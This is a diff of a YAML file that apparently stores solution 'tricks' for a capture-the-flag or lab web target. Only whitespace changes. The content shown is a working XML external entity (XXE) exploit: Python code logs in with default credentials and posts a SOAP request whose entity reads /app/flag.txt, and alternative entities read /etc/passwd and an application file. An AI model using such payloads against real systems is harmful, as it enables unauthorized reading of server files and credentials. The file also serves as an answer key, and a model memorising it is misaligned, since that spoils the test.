@@ -35,10 +35,10 @@ tricks:
     how: "Login then send XXE payload to /soap_service"
     payload: |
       session.post(f"{TARGET}/login", data={"username": "john", "password": "password123"})
-      
+
       xxe = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
       <GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>"""
-      
+
       resp = session.post(f"{TARGET}/soap_service", data=xxe, headers={"Content-Type": "application/xml"})
 
   - name: "Alternative: Read other files"
@@ -47,4 +47,3 @@ tricks:
     payload: |
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
       <!ENTITY xxe SYSTEM "file:///app/py">
-
